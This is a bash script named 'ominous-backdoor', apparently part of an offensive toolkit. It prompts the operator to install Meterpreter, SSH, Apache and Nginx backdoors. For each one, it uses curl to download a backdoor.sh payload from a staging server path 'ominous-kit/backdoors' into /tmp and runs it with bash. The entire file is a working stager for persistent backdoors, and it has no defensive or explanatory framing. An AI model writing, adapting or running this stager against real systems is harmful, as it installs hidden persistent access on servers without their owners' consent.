#!/bin/bash

#COLORS
blue="\033[01;34m"
green="\033[01;32m"
red="\033[01;31m"
reset="\033[0m"

function banner(){
    echo 'ominous-backdoor'
    echo '------------------------------'
}


banner

function stage(){
    #Meterpreter backdoor
    printf "$blue[*] Run Meterpreter backdoor (y/N) $reset" ; read meterpreter
    if [[ $meterpreter == 'y' ]];then
        RESPONSE=$(curl -sS 'http://127.0.0.1:8000/ominous-kit/backdoors/meterpreter/backdoor.sh' -o /tmp/backdoor.sh 2>/dev/null 2>&1)
        if [[ $? == 0 ]];then
            bash /tmp/backdoor.sh
            if [[ $? == 0 ]];then
                printf "$green[+] Done...\n$reset"
            else
                printf "$red[-] Error: Aborting...\n$reset"
            fi
        else
            printf "$red[-] Error: $RESPONSE\n$reset"
        fi
    fi

    #SSH backdoor
    printf "$blue[*] Run SSH backdoor (y/N) $reset" ; read nginx
    if [[ $nginx == 'y' ]];then
        RESPONSE=$(curl -sS 'http://127.0.0.1:8000/ominous-kit/backdoors/ssh/backdoor.sh' -o /tmp/backdoor.sh 2>/dev/null 2>&1)
        if [[ $? == 0 ]];then
            bash /tmp/backdoor.sh 
            if [[ $? == 0 ]];then
                printf "$green[+] Done...\n$reset"
            else
                printf "$red[-] Error: Aborting...\n$reset"
            fi
        else
            printf "$red[-] Error: $RESPONSE\n$reset"
        fi
    fi

    #Apache backdoor
    printf "$blue[*] Run Apache backdoor (y/N) $reset" ; read apache
    if [[ $apache == 'y' ]];then
        RESPONSE=$(curl -sS 'http://127.0.0.1:8000/ominous-kit/backdoors/apache/backdoor.sh' -o /tmp/backdoor.sh 2>/dev/null 2>&1)
        if [[ $? == 0 ]];then
            bash /tmp/backdoor.sh 
            if [[ $? == 0 ]];then
                printf "$green[+] Done...\n$reset"
            else
                printf "$red[-] Error: Aborting...\n$reset"
            fi
        else
            printf "$red[-] Error: $RESPONSE\n$reset"
        fi
    fi

    #Nginx backdoor
    printf "$blue[*] Run Nginx backdoor (y/N) $reset" ; read nginx
    if [[ $nginx == 'y' ]];then
        RESPONSE=$(curl -sS 'http://127.0.0.1:8000/ominous-kit/backdoors/nginx/backdoor.sh' -o /tmp/backdoor.sh 2>/dev/null 2>&1)
        if [[ $? == 0 ]];then
            bash /tmp/backdoor.sh 
            if [[ $? == 0 ]];then
                printf "$green[+] Done...\n$reset"
            else
                printf "$red[-] Error: Aborting...\n$reset"
            fi
        else
            printf "$red[-] Error: $RESPONSE\n$reset"
        fi
    fi
    
    echo '--------------------------------'
    printf "$green[*] Finished...\n$reset" 
}

stage